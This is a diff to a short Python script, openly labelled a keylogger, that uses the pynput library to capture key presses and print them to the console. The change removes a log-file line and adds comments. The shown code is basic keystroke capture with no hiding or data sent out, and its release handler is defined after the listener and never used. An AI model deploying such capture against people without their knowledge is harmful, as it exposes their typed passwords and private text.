@@ -3,11 +3,9 @@
 from pynput import keyboard
 from datetime import datetime
 
-f=open('storelog.txt','a')
-f.close()
-
 print ('Keylogger Started: ' + str(datetime.now()))
 
+#defines on_press function so that whenever a key is pressed its extracted, the listener is used as a callback device
 def on_press(key):
     try:
         print('{0}'.format(key.char))
@@ -16,6 +14,7 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 
+#Ends keylogger program
 def on_release(key):
     print('{0} released'.format(key))
     if key == keyboard.Key.esc:
